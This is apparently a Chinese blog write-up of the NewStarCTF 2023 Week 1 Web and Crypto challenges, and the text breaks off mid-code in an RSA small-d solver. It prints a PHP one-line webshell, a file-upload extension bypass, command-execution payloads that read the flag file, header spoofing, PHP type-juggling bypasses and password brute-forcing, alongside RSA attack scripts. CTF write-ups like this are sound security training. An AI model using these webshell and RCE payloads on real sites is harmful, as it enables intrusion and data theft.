<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【2023NewStar】#Week1 Web和Crypto 全题解！涉及知识扩展~ - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【2023NewStar】#Week1 Web和Crypto 全题解！涉及知识扩展~" />
<meta property="og:description" content="文章目录 2023NewStarCTFWeb泄露的秘密Begin of UploadErrorFlaskBegin of HTTP考点：对请求头的考察 Begin of PHPR!C!ELogin Cryptobabyrsa：考点：多素数rsa Vigeneresmall_d考点：低解密指数攻击 Baby_xor考点：异或 Affine考点：仿射密码 BabyEncodingbabyaes考点：异或 aes中cbc模式 2023NewStarCTF Web 泄露的秘密 www.zip Begin of Upload 打开源码 找到限制是在前端
我们抓包 上传正常后缀的文件 比如jpg结尾
但是这样传上去服务器是无法解析的
所以我们进行抓包 然后在bp中修改后缀名
将我们上传的后缀jpg在请求包中改为php 服务器就可以解析我们的语句了
一句话木马:&lt;?php eval($_POST[&#39;a&#39;]);?&gt;
然后进入到我们上传的这个文件中就可以rce啦
http://13878733-90ba-4e0c-9a0a-4ce861aaa1bf.node4.buuoj.cn:81/upload/aaa_b.php?b=system(%27cat%20/fllll4g%27);
ErrorFlask python中flask启的框架
输入非法字符，报错
在报错中找到源代码
Begin of HTTP 考点：对请求头的考察 POST /?ctf=ctfer HTTP/1.1 Host: node4.buuoj.cn:27705 //设置发起请求的浏览器 User-Agent: NewStarCTF2023 //设置只有本地用户才能访问 知识扩展 这些都可以用 Forwarded-For:127.0.0.1 Forwarded:127.0.0.1 X-Forwarded-Host:127.0.0.1 X-remote-IP:127.0.0.1 X-remote-addr:127.0.0.1 True-Client-IP:127.0.0.1 X-Client-IP:127.0.0.1 Client-IP:127.0.0.1 X-Real-IP:127.0.0.1 Ali-CDN-Real-IP:127.0.0.1 Cdn-Src-Ip:127.0.0.1 Cdn-Real-Ip:127.0.0.1 CF-Connecting-IP:127.0.0.1 X-Cluster-Client-IP:127.0.0.1 WL-Proxy-Client-IP:127." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/ff4782c6ff8c126aff7b334f8a53c2c3/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-02T13:14:48+08:00" />
<meta property="article:modified_time" content="2023-10-02T13:14:48+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【2023NewStar】#Week1 Web和Crypto 全题解！涉及知识扩展~</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#2023NewStarCTF_1" rel="nofollow">2023NewStarCTF</a></li><li><ul><li><a href="#Web_3" rel="nofollow">Web</a></li><li><ul><li><a href="#_5" rel="nofollow">泄露的秘密</a></li><li><a href="#Begin_of_Upload_9" rel="nofollow">Begin of Upload</a></li><li><a href="#ErrorFlask_29" rel="nofollow">ErrorFlask</a></li><li><a href="#Begin_of_HTTP_37" rel="nofollow">Begin of HTTP</a></li><li><ul><li><a href="#_39" rel="nofollow">考点：对请求头的考察</a></li></ul> 
    </li><li><a href="#Begin_of_PHP_83" rel="nofollow">Begin of PHP</a></li><li><a href="#RCE_192" rel="nofollow">R!C!E</a></li><li><a href="#Login_228" rel="nofollow">Login</a></li></ul> 
   </li><li><a href="#Crypto_249" rel="nofollow">Crypto</a></li><li><ul><li><a href="#babyrsa_251" rel="nofollow">babyrsa：</a></li><li><ul><li><a href="#rsa_253" rel="nofollow">考点：多素数rsa</a></li></ul> 
    </li><li><a href="#Vigenere_290" rel="nofollow">Vigenere</a></li><li><a href="#small_d_302" rel="nofollow">small_d</a></li><li><ul><li><a href="#_304" rel="nofollow">考点：低解密指数攻击</a></li></ul> 
    </li><li><a href="#Baby_xor_494" rel="nofollow">Baby_xor</a></li><li><ul><li><a href="#_496" rel="nofollow">考点：异或</a></li></ul> 
    </li><li><a href="#Affine_527" rel="nofollow">Affine</a></li><li><ul><li><a href="#_529" rel="nofollow">考点：仿射密码</a></li></ul> 
    </li><li><a href="#BabyEncoding_641" rel="nofollow">BabyEncoding</a></li><li><a href="#babyaes_653" rel="nofollow">babyaes</a></li><li><ul><li><a href="#_aescbc_655" rel="nofollow">考点：异或 aes中cbc模式</a></li></ul> 
   </li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="2023NewStarCTF_1"></a>2023NewStarCTF</h2> 
<h3><a id="Web_3"></a>Web</h3> 
<h4><a id="_5"></a>泄露的秘密</h4> 
<p><code>www.zip </code></p> 
<h4><a id="Begin_of_Upload_9"></a>Begin of Upload</h4> 
<p>打开源码 找到限制是在前端</p> 
<p>我们抓包 上传正常后缀的文件 比如jpg结尾</p> 
<p>但是这样传上去服务器是无法解析的</p> 
<p>所以我们进行抓包 然后在bp中修改后缀名</p> 
<p>将我们上传的后缀jpg在请求包中改为php 服务器就可以解析我们的语句了</p> 
<p>一句话木马:<code>&lt;?php eval($_POST['a']);?&gt;</code></p> 
<p>然后进入到我们上传的这个文件中就可以rce啦</p> 
<p><code>http://13878733-90ba-4e0c-9a0a-4ce861aaa1bf.node4.buuoj.cn:81/upload/aaa_b.php?b=system(%27cat%20/fllll4g%27);</code></p> 
<p><img src="https://images2.imgbox.com/70/1a/gW6RXlgZ_o.png" alt="image-20230926083224320"></p> 
<h4><a id="ErrorFlask_29"></a>ErrorFlask</h4> 
<p>python中flask启的框架</p> 
<p>输入非法字符，报错</p> 
<p>在报错中找到源代码</p> 
<h4><a id="Begin_of_HTTP_37"></a>Begin of HTTP</h4> 
<h5><a id="_39"></a>考点：对请求头的考察</h5> 
<pre><code class="prism language-http">POST /?ctf=ctfer HTTP/1.1
Host: node4.buuoj.cn:27705
//设置发起请求的浏览器
User-Agent: NewStarCTF2023
//设置只有本地用户才能访问  知识扩展 这些都可以用
Forwarded-For:127.0.0.1
Forwarded:127.0.0.1
X-Forwarded-Host:127.0.0.1
X-remote-IP:127.0.0.1
X-remote-addr:127.0.0.1
True-Client-IP:127.0.0.1
X-Client-IP:127.0.0.1
Client-IP:127.0.0.1
X-Real-IP:127.0.0.1
Ali-CDN-Real-IP:127.0.0.1
Cdn-Src-Ip:127.0.0.1
Cdn-Real-Ip:127.0.0.1
CF-Connecting-IP:127.0.0.1
X-Cluster-Client-IP:127.0.0.1
WL-Proxy-Client-IP:127.0.0.1
Proxy-Client-IP:127.0.0.1
Fastly-Client-Ip:127.0.0.1
True-Client-Ip:127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
//设置发起访问请求的网址
Referer: newstarctf.com
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://node4.buuoj.cn:27705
Connection: close
Cookie: track_uuid=b0378d4d-bdbe-4b92-d3d9-4e70dceeaff3; power=ctfer
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

secret=n3wst4rCTF2023g00000d
</code></pre> 
<h4><a id="Begin_of_PHP_83"></a>Begin of PHP</h4> 
<p>源码开套：</p> 
<pre><code class="prism language-php"> <span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 1=&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 2=&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 3=&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$flag3</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag3</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 4=&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$flag4</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag4</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 5=&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag5</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> 
</code></pre> 
<p>首先进入第一关：</p> 
<p>利用数组特性绕过<code>if($_GET['key1'] !== $_GET['key2'] &amp;&amp; md5($_GET['key1']) == md5($_GET['key2']))</code></p> 
<p>因为md5不能对数组进行加密，所以设置数据类型均为数组的时候就会全部返回null，使得两值相等</p> 
<p>payload:<code>?key1[]=11&amp;key2[]=22</code></p> 
<p>第二关：</p> 
<p>同理，数组绕过，返回值均为null 相等</p> 
<p>第三关：</p> 
<p>strcmp漏洞 如果输入错误数据类型无法比较报错，执行的结果也是返回0</p> 
<p>所以使用数组报错</p> 
<p>第四关：</p> 
<p><code>is_numeric</code> 字符串绕过<code>2024a</code> 同样使用数组绕过对数字的验证</p> 
<p>第五关：</p> 
<p>高度重视两个函数：</p> 
<p><code>extract</code>: 给设定的变量赋值</p> 
<p><code>foreach</code>: 遍历键值对中的值</p> 
<p>我们传的值只要设置为符号就可以绕过foreach中的匹配，但是当我们成功绕过我们发现，啊咋多了个flag5</p> 
<p>这也没有之前的设置啊</p> 
<p>然后查询了一些extract函数</p> 
<p><img src="https://images2.imgbox.com/5b/4b/L9PLHPuO_o.png" alt="image-20230926102735451"></p> 
<p>发现其赋值的特性，所以在post中对flag5给个初始值就行，默认为true。</p> 
<p><img src="https://images2.imgbox.com/91/88/zfCaifT1_o.png" alt="image-20230926102757103"></p> 
<h4><a id="RCE_192"></a>R!C!E</h4> 
<p>首先是md5的绕过 这个密码比较特殊 网上一搜就有了 <code>114514</code></p> 
<p>这里一般使用python来爆破（当时偷懒了直接网上搜的</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">def</span> <span class="token function">crack</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
crack<span class="token punctuation">(</span><span class="token string">"c4d038"</span><span class="token punctuation">)</span>
</code></pre> 
<p>然后就可以进行rce了</p> 
<p>过滤了好多：<code> if(!preg_match("/flag|system|pass|cat|ls/i",$code))</code></p> 
<p>使用exec代替system</p> 
<p>使用tac代替cat</p> 
<p>使用通配符* 代替flag</p> 
<p>payload：<code>password=114514&amp;e[v.a.l=echo(exec('tac /f*'));</code></p> 
<p>在传参的时候 变量名会将不合法的字符转化为下划线 只会转换一次 其中不合法字符包括<code>[</code>和 <code>.</code> 所以让第一个转换为下划线 后面的点号就不会被改变</p> 
<p>避大坑：一定要加一个echo！！！！一开始忘记让它回显了555 也可以<code>var_dump()</code></p> 
<p>法二：</p> 
<p><code>var_dump(file_get_contents($_POST['_']))$_=</code></p> 
<h4><a id="Login_228"></a>Login</h4> 
<p>有注册界面 先尝试一下普通用户进去的样子 否则注册界面写出来就没有什么意义了</p> 
<p>在交互模式中退出方法<code>ctrl+c</code> 或者 <code>ctrl+d</code></p> 
<p>在bin目录中一般存放的是可执行命令</p> 
<p>退出之后我们思考为什么一进来就是在chat程序中 肯定是前面有人输入其他命令了嘛</p> 
<p>我们点击向上键 可以看到内容</p> 
<p>但是个人感觉没什么大用哈哈</p> 
<p>还是得爆破密码</p> 
<p>在bp中跑一下 admin的密码是000000</p> 
<h3><a id="Crypto_249"></a>Crypto</h3> 
<h4><a id="babyrsa_251"></a>babyrsa：</h4> 
<h5><a id="rsa_253"></a>考点：多素数rsa</h5> 
<p>首先yafu分解得到10个素数</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

e <span class="token operator">=</span> <span class="token number">65537</span>
n <span class="token operator">=</span> <span class="token number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span>
c <span class="token operator">=</span> <span class="token number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span>

P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2217990919</span>
<span class="token punctuation">,</span><span class="token number">4278428893</span>
<span class="token punctuation">,</span> <span class="token number">2804303069</span>
<span class="token punctuation">,</span> <span class="token number">3654864131</span>
<span class="token punctuation">,</span> <span class="token number">2923072267</span>
<span class="token punctuation">,</span> <span class="token number">2338725373</span>
<span class="token punctuation">,</span> <span class="token number">2706073949</span>
<span class="token punctuation">,</span> <span class="token number">2970591037</span>
<span class="token punctuation">,</span> <span class="token number">2370292207</span>
<span class="token punctuation">,</span> <span class="token number">2463878387</span>
<span class="token punctuation">,</span> <span class="token number">3939901243</span>
<span class="token punctuation">,</span> <span class="token number">2794985117</span>
<span class="token punctuation">,</span> <span class="token number">3207148519</span>
<span class="token punctuation">,</span> <span class="token number">4093178561</span>
<span class="token punctuation">,</span> <span class="token number">3831680819</span><span class="token punctuation">]</span>
phi <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    phi <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#b'flag{us4_s1ge_t0_cal_phI}'</span>
</code></pre> 
<h4><a id="Vigenere_290"></a>Vigenere</h4> 
<p>还是推荐：https://www.guballa.de/vigenere-solver</p> 
<p>然后对于题目中的描述 我搜了一些是法语：不可破译的语言</p> 
<p>那么我们在破解的时候选择French</p> 
<p><img src="https://images2.imgbox.com/1b/50/KdIW3EsU_o.png" alt="image-20230926120113199"></p> 
<p>此外想补充一下可以根据开头密文和部分已知明文flag进行匹配推测密钥</p> 
<h4><a id="small_d_302"></a>small_d</h4> 
<h5><a id="_304"></a>考点：低解密指数攻击</h5> 
<p>源码：</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

d <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> inverse<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>

<span class="token comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span>
<span class="token comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span>
<span class="token comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span>
</code></pre> 
<p>下面是直接调用的板子：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># numerator(n):分子, denominator(d)：分母</span>
<span class="token keyword">def</span> <span class="token function">t_cf</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 将分数 x/y 转为连分数的形式</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">while</span> d<span class="token punctuation">:</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n <span class="token operator">//</span> d<span class="token punctuation">)</span>
        n<span class="token punctuation">,</span> d <span class="token operator">=</span> d<span class="token punctuation">,</span> n <span class="token operator">%</span> d
    <span class="token keyword">return</span> res


<span class="token keyword">def</span> <span class="token function">cf</span><span class="token punctuation">(</span>sub_res<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 得到渐进分数的分母和分子</span>
    n<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> sub_res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment"># 从后面往前循环</span>
        d<span class="token punctuation">,</span> n <span class="token operator">=</span> n<span class="token punctuation">,</span> i <span class="token operator">*</span> n <span class="token operator">+</span> d
    <span class="token keyword">return</span> d<span class="token punctuation">,</span> n


<span class="token keyword">def</span> <span class="token function">list_fraction</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment"># 列出每个渐进分数</span>
    res <span class="token operator">=</span> t_cf<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
